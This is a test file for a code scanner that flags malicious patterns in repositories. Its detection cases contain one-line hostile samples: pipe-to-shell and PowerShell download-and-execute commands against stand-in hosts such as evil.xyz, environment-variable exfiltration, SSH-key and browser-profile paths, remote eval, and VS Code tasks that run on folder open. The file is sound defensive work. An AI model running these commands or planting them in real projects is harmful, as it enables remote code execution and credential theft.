import { describe, it, expect } from "vitest";
import { scanFiles } from "../src/scanner/scan";
import { parseLenient } from "../src/scanner/packageJson";
import { classifyUrl } from "../src/scanner/url";
import { RULES } from "../src/scanner/rules";

const scan = (path: string, content: string) => scanFiles([{ path, content }]);
const ids = (path: string, content: string) => scan(path, content).findings.map((f) => f.ruleId);

describe("detects", () => {
  it.each<[string, string, string, string]>([
    ["BOM in package.json", "package.json", '\uFEFF{"scripts":{"postinstall":"node evil.js"}}', "npm-lifecycle-script"],
    ["trailing commas", "package.json", '{"scripts":{"postinstall":"node evil.js",},}', "npm-lifecycle-script"],
    ["comments in package.json", "package.json", '{/* a */"scripts":{// b\n"postinstall":"node evil.js"}}', "npm-lifecycle-script"],
    ["trailing comma is reported", "package.json", '{"scripts":{},}', "malformed-package-json"],
    ["broken package.json hook", "package.json", '{"scripts":{"postinstall":"node evil.js"', "npm-lifecycle-script"],
    ["postprepare", "package.json", '{"scripts":{"postprepare":"node evil.js"}}', "npm-lifecycle-script"],
    ["prestart", "package.json", '{"scripts":{"prestart":"node evil.js"}}', "npm-implicit-script"],
    ["git dependency", "package.json", '{"dependencies":{"x":"git+https://evil.xyz/x.git"}}', "dependency-git"],
    ["github shorthand", "package.json", '{"dependencies":{"x":"someone/thing#main"}}', "dependency-git"],
    ["tarball dependency", "package.json", '{"devDependencies":{"x":"http://evil.xyz/y.tgz"}}', "dependency-url"],
    ["override to URL", "package.json", '{"overrides":{"lodash":"https://evil.xyz/l.tgz"}}', "dependency-url"],
    ["bundled archive", "package.json", '{"dependencies":{"x":"file:./x.tgz"}}', "dependency-local-archive"],
    ["lockfile source", "package-lock.json", '{"a":{"resolved": "https://evil.xyz/a.tgz"}}', "lockfile-untrusted-source"],
    ["yarn.lock source", "yarn.lock", 'a@1:\n  resolved "http://1.2.3.4/a.tgz"', "lockfile-untrusted-source"],
    ["pip index", "requirements.txt", "--extra-index-url https://evil.xyz/simple\nx", "pip-custom-source"],
    ["curl | cmd", ".vscode/tasks.json", '{"command":"curl https://a.vercel.app/s | cmd"}', "pipe-to-shell"],
    ["curl | tee | bash", "a.sh", "curl -s https://x.io/i | tee f | bash", "pipe-to-shell"],
    ["bash <(curl)", "a.sh", "bash <(curl -s https://x.io/i)", "pipe-to-shell"],
    ["bash -c $(curl)", "a.sh", 'bash -c "$(curl -fsSL https://x.io/i)"', "pipe-to-shell"],
    ["curl continued onto the next line", "a.sh", "curl -s https://x.io/i \\\n  | bash", "pipe-to-shell"],
    ["curl -o then sh", "a.sh", "curl -o /tmp/x https://evil.xyz/x && sh /tmp/x", "download-and-run"],
    ["download then run on separate lines", "a.sh", "wget https://evil.xyz/x -O /tmp/x\necho hi\nchmod +x /tmp/x", "download-and-run"],
    ["iex (iwr)", "a.ps1", "iex (iwr https://evil.xyz/a.ps1)", "powershell-download-exec"],
    ["irm | iex", "a.ps1", "irm https://evil.xyz/a.ps1 | iex", "pipe-to-shell"],
    ["DownloadString", "a.ps1", "IEX (New-Object Net.WebClient).DownloadString('https://evil.xyz')", "powershell-download-exec"],
    ["powershell -enc", "a.bat", "powershell -nop -enc SQBFAFgAIAAoAE4A", "powershell-encoded"],
    ["powershell -e in JS", "a.js", 'exec("powershell.exe -e SQBFAFgAIAAoAE4A")', "powershell-encoded"],
    ["hidden window", "a.bat", "powershell -w hidden -File x.ps1", "windows-lolbin"],
    ["execution policy bypass", "a.bat", "powershell -ExecutionPolicy Bypass -File x.ps1", "windows-lolbin"],
    ["VS Code folderOpen", ".vscode/tasks.json", '{"runOptions":{"runOn":"folderOpen"},"command":"node x.js"}', "vscode-auto-task"],
    ["VS Code auto tasks setting", ".vscode/settings.json", '{"task.allowAutomaticTasks":"on"}', "vscode-auto-task"],
    ["workspace file", "x.code-workspace", '{"tasks":[{"runOn" : "folderOpen"}]}', "vscode-auto-task"],
    ["node runs a font", ".vscode/tasks.json", '{"command":"node ./public/fonts/fa-solid-400.woff2"}', "run-disguised-file"],
    ["env loop", "a.js", "for (const k in process.env) send(k)", "env-bulk-access"],
    ["env entries", "a.js", "for (const [k,v] of Object.entries(process.env)) {}", "env-bulk-access"],
    ["env python", "a.py", "for k,v in os.environ.items(): pass", "env-bulk-access"],
    ["env powershell", "a.ps1", "Get-ChildItem env: | ConvertTo-Json", "env-bulk-access"],
    ["single env exfil", "a.js", "axios.post(u,{k:process.env.AWS_SECRET})", "env-exfiltration"],
    ["URL in a variable", "a.js", "const u='https://evil.xyz/c';\naxios.post(u, d)", "outbound-network"],
    ["call split over lines", "a.js", "fetch(\n  'https://evil.xyz/c')", "outbound-network"],
    ["axios config object", "a.js", "axios({ method: 'post', url: 'https://evil.xyz/c' })", "outbound-network"],
    ["websocket", "a.js", "new WebSocket('wss://evil.xyz')", "outbound-network"],
    ["second URL on the line", "a.js", "fetch('https://api.github.com');fetch('https://evil.xyz')", "outbound-network"],
    ["URL hidden behind a comment", "a.js", "/*https://api.github.com*/ fetch('https://evil.xyz')", "outbound-network"],
    ["template URL", "a.js", "fetch(`https://${h}/x`)", "outbound-network"],
    ["userinfo trick", "a.js", "fetch('https://github.com:x@evil.xyz/')", "deceptive-url"],
    ["raw user content", "a.js", "fetch('https://raw.githubusercontent.com/evil/x/p.js')", "outbound-network"],
    ["release download", "a.js", "fetch('https://github.com/evil/x/releases/download/v1/p')", "outbound-network"],
    ["paste host", "a.js", "const x='https://api.npoint.io/abc'", "suspicious-host"],
    ["Discord webhook", "a.js", "const x='https://discord.com/api/webhooks/1/a'", "suspicious-host"],
    ["raw IP", "a.js", "const x='http://45.61.12.9:1244/p'", "raw-ip-network"],
    ["hex IP", "a.js", "const x='http://0x2d3d0c09/p'", "raw-ip-network"],
    ["base64 URL", "a.js", "const x='aHR0cHM6Ly9ldmlsLnh5eg=='", "encoded-url"],
    ["fetch then eval", "a.js", "fetch(u).then(r=>r.text()).then(eval)", "remote-eval"],
    ["fetch then Function", "a.js", "axios.get(u).then(r => {\n new Function(r.data)() })", "remote-eval"],
    ["constructor string", "a.js", "(()=>{}).constructor('return 1')()", "dynamic-exec"],
    ["split eval name", "a.js", "globalThis['ev'+'al'](x)", "dynamic-exec"],
    ["indirect eval", "a.js", "(0, eval)(x)", "dynamic-exec"],
    ["aliased eval", "a.js", "const e = eval;", "dynamic-exec"],
    ["vm", "a.js", "vm.runInThisContext(x)", "dynamic-exec"],
    ["base64 with backticks", "a.js", "Buffer.from(x, `base64`)", "encoded-payload"],
    ["hex decode", "a.js", "Buffer.from(x, 'hex')", "encoded-payload"],
    ["child_process with backticks", "a.js", "require(`child_process`).exec('whoami')", "child-process"],
    ["split child_process", "a.js", "require('child_' + 'process')", "child-process"],
    ["file under dist", "dist/i.js", "eval(atob('x'))", "dynamic-exec"],
    ["file under build", "build/gyp.js", "require('child_process')", "child-process"],
    ["extensionless script", ".husky/pre-commit", "curl https://x.io | sh", "pipe-to-shell"],
    ["keys: ssh, Windows separators", "a.js", "const p='C:\\\\Users\\\\x\\\\.ssh\\\\id_rsa'", "credential-paths"],
    ["browser profile", "a.py", 'open("Chrome/User Data/Local State")', "credential-paths"],
    ["bare CR does not hide code in a comment", "a.js", "// hi\reval(x)", "dynamic-exec"],
    ["U+2028 does not hide code in a comment", "a.js", "// hi\u2028eval(x)", "dynamic-exec"],
  ])("%s", (_n, path, content, id) => expect(ids(path, content)).toContain(id));
});

describe("does not raise the alarm for", () => {
  const worst = (path: string, content: string) => scan(path, content).verdict;
  it.each<[string, string, string]>([
    [".npmrc in a comment", "a.js", "// see .npmrc docs"],
    ["product name Exodus", "a.js", "const movie='Exodus'"],
    ["MetaMask login", "a.js", "const t='MetaMask login'"],
    ["MetaMask label", "a.js", "const t='MetaMask'"],
    ["'Local State' label", "a.js", "const t='Local State'"],
    ["husky prepare", "package.json", '{"scripts":{"prepare":"husky"}}'],
    ["redis.eval", "a.js", "redis.eval(script)"],
    ["model.eval()", "a.py", "model.eval()"],
    ["RegExp exec", "a.js", "/x/.exec(s)"],
    ["eval in a comment", "a.js", "// never use eval(x)"],
    ["secrets path in a Python comment", "a.py", "# copies ~/.ssh/id_rsa"],
    ["localhost", "a.js", "fetch('http://127.0.0.1:3000/x')"],
    ["private network IP", "a.js", "const x='http://192.168.1.4/'"],
    ["npm lockfile", "package-lock.json", '{"a":{"resolved":"https://registry.npmjs.org/a/-/a-1.tgz","integrity":"sha512-aaaa"}}'],
    ["public env URL in a call", "a.js", "fetch(process.env.API_URL)"],
    ["README install command", "README.md", "curl https://x.io | sh"],
    ["ignore files", ".gitignore", ".npmrc\nid_rsa\n.ssh/"],
  ])("%s", (_n, path, content) => expect(worst(path, content)).toBe("no-known-indicators"));

  it("but documentation commands are still listed", () => expect(ids("README.md", "curl https://x.io | sh")).toContain("pipe-to-shell"));
  it("but benign hooks are still listed", () => expect(scan("package.json", '{"scripts":{"prepare":"husky"}}').findings[0]).toMatchObject({ severity: "low", ruleId: "npm-lifecycle-script" }));
  it("a benign hook with something appended is not benign", () => expect(worst("package.json", '{"scripts":{"prepare":"husky && node x.js"}}')).toBe("review-first"));
});

describe("comment handling can't be used to hide code", () => {
  it.each([
    ["closing a block comment", "/*\n// */ eval(x)\n"],
    ["inside a template", "`\n// ${eval(x)}\n`"],
    ["inside JSX", "<p>\n// {eval(x)}\n</p>"],
  ])("%s", (_n, content) => expect(scan("a.jsx", content).findings.find((f) => f.ruleId === "dynamic-exec")).toMatchObject({ severity: "high" }));
});

describe("findings", () => {
  const all = scanFiles([
    { path: "package.json", content: '{"scripts":{"postinstall":"node x"},"dependencies":{"a":"git+https://e.xyz/a.git"}}' },
    { path: "a.js", content: "eval(x)\n" + "y".repeat(3000) },
    { path: "package-lock.json", content: '{"resolved":"https://e.xyz/a.tgz"}' },
  ]).findings;
  it("always carry rule ID, category, file, line, evidence, severity, explanation, remediation and confidence", () => {
    expect(all.length).toBeGreaterThanOrEqual(5);
    for (const f of all) {
      for (const k of ["ruleId", "category", "file", "evidence", "explanation", "remediation"] as const) expect(f[k], `${f.ruleId}.${k}`).toBeTruthy();
      expect(f.line).toBeGreaterThan(0);
      expect(["critical", "high", "medium", "low"]).toContain(f.severity);
      expect(["high", "medium", "low"]).toContain(f.confidence);
    }
  });
  it("every rule defines them", () => RULES.forEach((r) => { expect(r.remediation.length).toBeGreaterThan(10); expect(r.confidence).toBeTruthy(); expect(r.category).toBeTruthy(); }));
  it("rule IDs are unique", () => expect(new Set(RULES.map((r) => r.id)).size).toBe(RULES.length));
  it("evidence shows the match even on a very long line", () => {
    const f = scan("a.js", "a".repeat(900) + ";eval(hidden);" + "b".repeat(900)).findings.find((x) => x.ruleId === "dynamic-exec")!;
    expect(f.evidence).toContain("eval(hidden)");
    expect(f.evidence.length).toBeLessThan(200);
  });
  it("reports the right line with CRLF and after multi-line matches", () => {
    expect(scan("a.js", "x\r\ny\r\neval(z)\r\n").findings[0].line).toBe(3);
    expect(scan("a.js", "\n\nfetch(\n'https://evil.xyz')").findings[0].line).toBe(3);
  });
  it("points at the hook inside scripts, not an earlier key of the same name", () => {
    expect(scan("package.json", '{\n"config":{\n"install":"x"},\n"scripts":{\n"install":"node evil.js"}}').findings[0].line).toBe(5);
  });
});

describe("helpers", () => {
  it("parseLenient keeps strings intact", () => {
    expect(parseLenient('{"a":"//not, a } comment",/*x*/"b":"\\",",}')?.value).toEqual({ a: "//not, a } comment", b: '",' });
    expect(parseLenient("{nope")).toBeNull();
  });
  it.each([
    ["https://api.github.com/x", "allowed"], ["https://api.github.com.evil.xyz/", "other"], ["https://evilexample.com", "other"], ["https://github.com/a/b", "allowed"],
    ["http://localhost:1", "local"], ["http://[::1]/", "local"], ["http://2130706433/", "local"], ["http://45.61.12.9", "raw-ip"], ["http://[2001:db8::1]/", "raw-ip"],
    ["https://github.com@evil.xyz", "deceptive"], ["https://x.ngrok.io", "suspicious"], ["not a url", "other"],
  ])("classifyUrl %s -> %s", (u, c) => expect(classifyUrl(u)).toBe(c));
  it("handles large hostile files quickly", () => {
    const t0 = performance.now();
    for (const s of ["curl ".repeat(40_000), "fetch(".repeat(40_000), "a".repeat(900_000), "'https://a".repeat(20_000), "/*".repeat(100_000), "Buffer.from(".repeat(20_000), "\n".repeat(200_000), "node -a ".repeat(40_000)]) scan("a.js", s);
    expect(performance.now() - t0).toBeLessThan(20_000);
  }, 30_000);
});
